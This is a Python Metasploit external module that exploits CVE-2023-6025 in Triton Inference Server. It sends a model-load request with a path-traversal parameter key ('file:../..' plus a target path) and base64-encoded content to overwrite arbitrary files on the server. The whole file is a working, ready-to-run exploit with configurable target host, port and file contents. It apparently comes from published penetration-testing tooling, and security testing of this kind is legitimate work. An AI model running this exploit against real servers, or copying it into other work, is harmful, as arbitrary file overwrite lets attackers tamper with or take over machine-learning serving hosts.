#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import base64
import pathlib

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Triton Inference Server arbitrary file overwrite',
    'description': '''
        When the Triton Inference Server is started with `--model-control-mode explicit` argument, an attacker is able to overwrite arbitrary files on the server.
    ''',
    'authors': [
        'l1k3beef', # Vuln Discovery
        'byt3bl33d3r <marcello@protectai.com>' # MSF Module
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/b27148e3-4da4-4e12-95ae-756d33d94687/'},
        {'type': 'cve', 'ref': 'CVE-2023-6025'}
    ],
    'type': 'single_scanner',
    'options': {
        'localfilepath': {'type': 'string', 'description': 'Local path with content to overwrite on target (cannot be used with filecontents option)', 'required': False, 'default': None},
        'remotefilepath': {'type': 'string', 'description': 'File to overwrite', 'required': True, 'default': '/tmp/HACKED'},
        'filecontents': {'type': 'string', 'description': 'File content to overwrite (cannot be used with localfilepath option)', 'required': False, 'default': None},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 8000},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return
    
    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
    file_contents = None

    if not args['localfilepath'] and not args['filecontents']:
        logging.error('localfilepath or filecontents options must be specified')
        return

    if args['localfilepath']:
        local_file = pathlib.Path(args['localfilepath'])
        if not local_file.exists() or not local_file.is_file():
            logging.error("localfilepath is not a file or does not exist")
            return

        with local_file.open("rb") as f:
            file_contents = f.read()
    else:
        file_contents = args['filecontents'].encode()

    r = requests.post(
        f"{base_url}/v2/repository/models/test/load",
        json={ "parameters" : {
            "config" : "{}",
            f"file:../..{args['remotefilepath']}": base64.b64encode(file_contents).decode()
            }
        }
    )

    logging.info(f"Exploit might have worked... Status: {r.status_code}")

if __name__ == '__main__':
    module.run(metadata, run)
